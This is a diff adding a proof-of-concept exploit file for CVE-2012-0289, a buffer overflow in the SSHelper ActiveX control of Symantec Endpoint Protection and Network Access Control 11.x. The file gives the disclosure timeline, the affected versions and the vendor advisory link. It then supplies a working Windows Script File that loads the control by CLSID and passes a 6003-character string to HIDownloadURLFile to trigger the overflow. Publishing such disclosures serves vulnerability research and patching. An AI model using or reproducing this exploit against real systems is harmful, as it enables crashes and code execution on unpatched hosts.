@@ -1,0 +1,75 @@
+# Symantec End Point Protection 11.x & Symantec Network Access Control 11.x Local Code Execution POC
+# Date: 22/05/2012
+# Author: 41.w4r10r
+# Software Link: Symantec.com
+# Version: 11.x
+# Tested on:
+#   Windows XP SP2 English
+#   Windows XP SP3 English
+#   Windows Vista 32Bit
+#   Windows 7 32Bit
+# CVE : CVE-2012-0289
+
+Time Line:
+30/08/2011 - Sent Details of the vulnerability
+31/08/2011 - Symantec Requested Affected Version Details
+31/08/2011 - Provided Requested Information with POC
+27/09/2011 - Vulnerability Confirmed by Symantec
+22/05/2012 - Advisory Released
+
+Symantec Advisory:
+http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120522_01
+
+Affected Products:
+
+Symantec Endpoint Protection
+11.0 RU6(11.0.600x)
+11.0 RU6-MP1(11.0.6100)
+11.0 RU6-MP2(11.0.6200)
+11.0 RU6-MP3(11.0.6300)
+11.0 RU7(11.0.700x)
+11.0 RU7-MP1(11.0.710x)
+
+Symantec Network Access Control
+11.0 RU6(11.0.600x)
+11.0 RU6-MP1(11.0.6100)
+11.0 RU6-MP2(11.0.6200)
+11.0 RU6-MP3(11.0.6300)
+11.0 RU7(11.0.700x)
+11.0 RU7-MP1(11.0.710x)
+
+Affected Resource:
+%%System%%\Symantec\Symantec Endpoint Protection\SSHelper.dll
+
+===
+POC
+===
+
+<?XML version='1.0' standalone='yes' ?>
+<package><job id='DoneInVBS' debug='false' error='true'>
+<object classid='clsid:D59EBAD7-AF87-4A5C-8459-D3F6B918E7C9' id='target' />
+<script language='vbscript'>
+prototype  = "Function HIDownloadURLFile ( ByVal cookie As Long ,  ByVal
+url As String ,  ByVal file_path As String ,  ByVal rule_name As String ,
+ ByVal cancel_message As String ,  ByVal downloading_time As Long ,  ByVal
+bResume As Boolean ,  ByVal bShowProgressDlg As Boolean ,  ByVal
+bAllowCancel As Boolean ,  ByVal username As String ,  ByVal password As
+String ,  ByVal show_error_delay As Long ) As Long"
+memberName = "HIDownloadURLFile"
+progid     = "SSHELPERLib.SSHelper"
+argCount   = 12
+arg1=1
+arg2="defaultV"
+arg3="defaultV"
+arg4="defaultV"
+arg5="defaultV"
+arg6=1
+arg7=True
+arg8=True
+arg9=True
+arg10="defaultV"
+arg11= String(6003, "A")
+arg12=1
+target.HIDownloadURLFile arg1 ,arg2 ,arg3 ,arg4 ,arg5 ,arg6 ,arg7 ,arg8
+,arg9 ,arg10 ,arg11 ,arg12
+</script></job></package>
